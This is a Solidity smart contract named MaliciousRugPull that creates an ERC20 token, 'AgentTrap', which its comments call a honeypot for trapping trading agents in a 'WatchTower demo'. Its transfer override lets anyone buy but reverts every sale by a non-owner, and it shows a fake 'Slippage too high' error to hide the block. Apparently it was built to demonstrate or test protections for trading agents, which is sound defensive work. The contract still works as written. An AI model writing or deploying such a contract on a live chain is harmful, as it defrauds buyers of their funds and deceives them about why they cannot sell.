// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title MaliciousRugPull
 * @dev A honeypot contract specifically designed to trap trading agents during the WatchTower demo.
 *      It allows anyone to buy, but blocks selling from any address other than the owner.
 */
contract MaliciousRugPull is ERC20, Ownable {
    mapping(address => bool) public isBlacklisted;
    bool public tradingEnabled = false;

    constructor() ERC20("AgentTrap", "TRAP") Ownable(msg.sender) {
        _mint(msg.sender, 1000000 * 10**decimals());
    }

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    // THE HONEYPOT TRAP:
    // This override ensures that while anyone can receive tokens (buying), 
    // only the owner is allowed to send tokens (selling).
    // An unprotected agent will buy this and instantly lose their capital.
    function _update(address from, address to, uint256 value) internal virtual override {
        require(tradingEnabled || from == owner() || to == owner(), "Trading not active");
        
        // Trap logic: if you are trying to sell (from != owner) and you aren't the owner
        // the transaction reverts. This is an untradable honeypot.
        if (from != owner() && from != address(0)) {
            require(false, "Slippage too high / Execution Reverted"); // Fake error message
        }

        super._update(from, to, value);
    }
}
